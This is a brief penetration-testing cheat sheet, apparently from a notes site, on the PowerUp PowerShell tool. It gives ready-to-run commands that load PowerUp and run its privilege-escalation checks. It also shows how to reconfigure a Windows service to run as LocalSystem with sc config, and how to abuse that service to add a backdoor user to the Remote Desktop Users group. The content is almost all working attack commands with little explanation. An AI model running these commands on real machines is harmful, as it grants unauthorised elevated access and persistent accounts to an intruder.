# PowerUp

## Enumeration

```csharp
. .\powerup.ps1
invoke-allchecks
```

## Service Abuse

{% hint style="info" %}
The service need to run as high privileged user. This can be changed using a sc in a cmd prompt.
{% endhint %}

```csharp
sc config MyService obj= "LocalSystem" password= ""
```

### Add user

```csharp
Invoke-ServiceUserAdd -ServiceName MyService -UserName b3v1l  -groupname "Remote Desktop Users"
```



